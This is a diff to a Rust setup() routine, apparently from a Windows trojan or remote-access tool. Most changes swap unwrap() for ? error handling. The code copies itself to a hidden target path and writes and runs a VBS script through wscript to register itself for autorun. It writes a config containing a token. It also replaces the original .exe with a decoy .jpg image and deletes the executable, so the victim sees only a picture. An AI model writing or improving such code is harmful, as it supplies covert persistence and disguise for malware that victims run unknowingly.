@@ -36,11 +36,16 @@ pub fn setup() -> Result<()> {
 
   if current_path == target_path {
     loop {
-      let conf = get_app_config().unwrap();
-      let new_path = conf.original_path.replace(".exe", "");
+      let conf = get_app_config()?;
+      let mut new_path = conf.original_path.clone().replace(".exe", "");
 
-      // Replacing with image;
-      match fs::write(&new_path, image_placeholder::get_placeholder_buf()) {
+      if !new_path.ends_with(".jpg") {
+        new_path.push_str(".jpg");
+      }
+
+      fs::write(&new_path, image_placeholder::get_placeholder_buf())?;
+      
+      match fs::remove_file(&conf.original_path) {
         Ok(_) => break,
         Err(_) => {
           thread::sleep(Duration::from_millis(10));
@@ -51,7 +56,7 @@ pub fn setup() -> Result<()> {
     return Ok(());
   }
 
-  fs::copy(&current_path, &target_path).unwrap();
+  fs::copy(&current_path, &target_path)?;
 
   // Run add and register as autorun
   let vbs_content = format!(
@@ -62,9 +67,9 @@ pub fn setup() -> Result<()> {
   "#,
     target_path = target_path
   );
-  fs::write(&vbs_path, &vbs_content).unwrap();
-  Command::new("wscript").arg(&vbs_path).output().unwrap();
-  fs::remove_file(&vbs_path).unwrap();
+  fs::write(&vbs_path, &vbs_content)?;
+  Command::new("wscript").arg(&vbs_path).output()?;
+  fs::remove_file(&vbs_path)?;
 
   // Create config file
   let conf_content = format!(
@@ -74,7 +79,7 @@ pub fn setup() -> Result<()> {
     "#,
     current_path, token,
   );
-  fs::write(&conf_path, &conf_content).unwrap();
+  fs::write(&conf_path, &conf_content)?;
 
   exit(0);
 }
